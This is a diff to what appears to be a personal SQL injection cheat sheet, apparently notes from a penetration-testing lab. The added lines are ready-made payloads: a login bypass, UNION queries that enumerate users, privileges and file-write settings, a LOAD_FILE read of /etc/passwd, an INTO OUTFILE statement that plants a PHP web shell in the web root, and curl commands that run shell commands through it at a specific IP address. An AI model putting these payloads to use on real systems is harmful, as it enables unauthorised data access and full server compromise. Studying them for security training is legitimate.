@@ -83,3 +83,23 @@
 |cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - 	|Read local file|
 |select 'file written successfully!' into outfile '/var/www/html/proof.txt' |	Write a string to a local file|
 |cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - 	|Write a web shell into the base web directory|
+
+
+Other misc steps
+
+```
+admin' OR '1' = '1' -- -
+' UNION SELECT 1,2,3,4,5 -- -
+' UNION SELECT 1,user(),3,4,5 -- -
+' UNION SELECT 1, grantee, privilege_type, is_grantable, 5 FROM information_schema.user_privileges -- -
+' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4, 5-- -
+' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables WHERE variable_name="secure_file_priv" -- -
+```
+
+writing webshell
+
+```
+' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "", "" INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -
+curl -w "\n" -s http://STMIP:STMPO/dashboard/shell.php?cmd=ls+/ | sed -e '1,2d'
+curl -w "\n" -s http://159.65.63.151:31872/dashboard/shell.php?cmd=ls+/ | sed -e '1,2d'
+```
